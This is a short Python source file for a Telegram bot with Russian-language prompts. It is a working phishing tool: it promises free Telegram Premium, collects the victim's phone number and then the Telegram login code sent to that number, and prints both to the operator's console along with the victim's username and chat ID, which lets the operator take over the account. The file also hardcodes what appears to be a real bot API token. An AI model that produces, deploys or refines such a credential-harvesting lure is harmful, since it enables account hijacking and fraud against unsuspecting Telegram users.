import telebot
from telebot import types

TOKEN = '7211390464:AAFaizSqi-nFdpUcvYDMdod6Y_lHGGi22mQ'
bot = telebot.TeleBot(TOKEN)
user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    premium_button = types.KeyboardButton("Получить Telegram Premium")
    markup.add(premium_button)
    bot.send_message(message.chat.id, "Привет! Нажми кнопку, чтобы получить Telegram Premium.", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "Получить Telegram Premium")
def get_phone_number(message):
    bot.send_message(message.chat.id, "Введите ваш номер телефона в формате +7xxxxxxxxxx:")
    bot.register_next_step_handler(message, process_phone_number)


def process_phone_number(message):
    phone_number = message.text
    if not phone_number.startswith('+7') or len(phone_number) != 12 or not phone_number[1:].isdigit():
        bot.send_message(message.chat.id, "Неверный формат номера. Попробуйте снова.")
        bot.register_next_step_handler(message, process_phone_number)
        return

    user_data[message.chat.id] = {'phone_number': phone_number}
    print(f"Номер телефона пользователя {message.from_user.username} (ID: {message.chat.id}): {phone_number}")

    bot.send_message(message.chat.id, "Введите код, который отправили на ваш номер Telegram:")
    bot.register_next_step_handler(message, process_code)

def process_code(message):
    code = message.text
    print(f"Код пользователя {message.from_user.username} (ID: {message.chat.id}): {code}")
    bot.send_message(message.chat.id, "Спасибо! Ваш запрос обрабатывается.")

if __name__ == '__main__':
    bot.polling(none_stop=True)